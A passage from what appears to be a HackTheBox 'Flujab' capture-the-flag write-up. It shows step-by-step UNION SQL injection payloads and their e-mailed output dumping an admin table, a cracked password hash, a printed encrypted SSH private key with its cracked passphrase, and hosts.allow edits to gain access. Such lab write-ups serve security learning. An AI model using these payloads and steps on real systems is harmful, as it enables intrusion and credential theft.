

------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;table-name-is-admin-lets-get-the-column-names-&quot;&gt;Table name is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; let’s get the column names :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--3&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:38:55 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:id
Message-ID: &amp;lt;50be6357006cbedc546152de64cd5407@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--     
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-gave-us-the-first-column-name-which-is-id-to-get-the-rest-of-the-column-names-we-will-add-and-column_nameprevious-column-name-here&quot;&gt;This gave us the first column name which is &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt;, to get the rest of the column names we will add &lt;code class=&quot;highlighter-rouge&quot;&gt;and column_name!='PREVIOUS COLUMN NAME HERE'&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--4&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:41:26 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:loginname
Message-ID: &amp;lt;3d6a306c2827c5d6b3e44ae2c9602d2e@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;second-column--loginname&quot;&gt;Second column : &lt;code class=&quot;highlighter-rouge&quot;&gt;loginname&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--5&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:44:08 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:namelc
Message-ID: &amp;lt;8a8dbbfb4a4c3a0968c819bc9e188e6c@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;third-column--namelc&quot;&gt;Third column : &lt;code class=&quot;highlighter-rouge&quot;&gt;namelc&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--6&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:46:45 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:email
Message-ID: &amp;lt;087443e0a9489da3ec320a89cc3df41b@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--                                                                    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;fourth-column--email&quot;&gt;Fourth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;email&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--7&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:48:47 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:access
Message-ID: &amp;lt;f2306132c2238cf545023e952591045d@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--                                           
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;fifth-column--access&quot;&gt;Fifth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-stopped-right-there-to-see-if-thats-enough-lets-see-what-data-can-we-get-from-these-columns&quot;&gt;I stopped right there to see if that’s enough, let’s see what data can we get from these columns.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--8&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:01:53 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:syadmin@flujab.htb:sysadmin-console-01.flujab.htb                                  
Message-ID: &amp;lt;547797c2649862cadc98c5c5e345208b@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#                                          
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-login-name-an-email-address-and-a-link-to-a-sysadmin-console-but-we-still-need-a-password-i-dont-know-if-i-had-to-enumerate-more-until-i-get-the-column-password-but-anyway-i-just-added-password-hoping-that-theres-a-column-called-password-and-i-was-right-&quot;&gt;We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; but anyway I just added password hoping that there’s a column called password, and I was right :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--9&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:03:22 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:syadmin@flujab.htb:sysadmin-console-01.flujab.htb
Message-ID: &amp;lt;783cf28dd5b1c56f309b9a45724c5ec5@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#                             
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-take-a-look-at-what-we-have-&quot;&gt;let’s take a look at what we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-is-a-sha256-hash-i-used-crackstation-to-crack-it-&quot;&gt;Password is a &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256&lt;/code&gt; hash. I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password--th3doct0r&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;th3doct0r&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-added-sysadmin-console-01flujabhtb-to-etchosts-then-i-went-to-httpsysadmin-console-01flujabhtb-&quot;&gt;I added &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin-console-01.flujab.htb&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sysadmin-console-01.flujab.htb/&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/81.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/82.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-the-direct-ip-access-error-again-but-this-time-on-port-8080-i-didnt-get-the-same-error-&quot;&gt;I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/83.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/84.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;ajenti-administration-panel-note--it-wont-be-accessible-if-your-ip-wasnt-in-the-whitelist&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cve-2008-0166-user-flag&quot;&gt;CVE-2008-0166, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-in-the-first-thing-i-noticed-was-the-notepad-&quot;&gt;After getting in the first thing I noticed was the notepad :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/85.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/86.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-so-we-can-read-and-write-some-stuff-on-the-server-i-checked-the-home-directory-and-it-had-a-lot-of-users-with-a-lot-of-user-flags-&quot;&gt;Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/88.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;for-example-&quot;&gt;For example :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/89.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/90.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-one-user-called-drno-had-ssh-directory-with-a-key-in-it&quot;&gt;But one user called &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; had &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; directory with a key in it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/91.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/92.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/93.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;userkey-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;userkey&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B

zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;unfortunately-it-was-encrypted-so-i-used-ssh2john-then-i-cracked-it-&quot;&gt;Unfortunately it was encrypted so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt; then I cracked it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/94.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password--shadowtroll&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;shadowtroll&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;chmod-600-drnokey-then-i-used-the-key-to-ssh-as-drno-and-we-got-the-user-flag-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 drno.key&lt;/code&gt;, then I used the key to ssh as &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; and we got the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nope-we-only-got-a-connection-reset-i-went-back-to-the-administration-panel-and-took-a-look-at-etchostsallow-&quot;&gt;Nope we only got a connection reset. I went back to the administration panel and took a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts.allow&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/97.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-added-my-ip-address-and-tried-again-&quot;&gt;I added my ip address and tried again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/98.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/99.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;still-a-connection-reset-i-went-back-and-added-sshd--all&quot;&gt;Still a connection reset. I went back and added &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd : ALL&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/100.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/101.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-but-now-it-doesnt-accept-the-key-it-was-just-a-troll-anyway-we-got-the-public-key-in-authorized_keys-&quot;&gt;It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/102.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# shell whitelisting + key auth enabled 
